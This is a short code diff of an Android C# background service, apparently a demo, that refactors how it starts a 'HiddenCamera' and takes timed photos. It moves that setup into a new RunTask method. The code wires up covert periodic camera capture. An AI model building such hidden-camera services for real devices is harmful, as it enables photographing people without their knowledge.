@@ -23,16 +23,11 @@ namespace ServicesDemo3
         public override void OnCreate()
         {
             base.OnCreate();
-
-            var cameraManager = (CameraManager)GetSystemService(CameraService);
-            _hiddenCamera = new HiddenCamera(cameraManager);
-            TimerPhotography(10);
+            RunTask(Constants.PERIOD_IN_SECONDS);
         }
 
         public override IBinder OnBind(Intent intent)
-        {
-            return null;
-        }
+            => null;
 
         [return: GeneratedEnum]
         public override StartCommandResult OnStartCommand(Intent intent, [GeneratedEnum] StartCommandFlags flags, int startId)
@@ -96,6 +91,13 @@ namespace ServicesDemo3
                .Build();
 
             return notification;
+        }
+
+        private void RunTask(int seconds)
+        {
+            var cameraManager = (CameraManager)GetSystemService(CameraService);
+            _hiddenCamera = new HiddenCamera(cameraManager);
+            TimerPhotography(seconds);
         }
 
         private void TimerPhotography(int seconds)
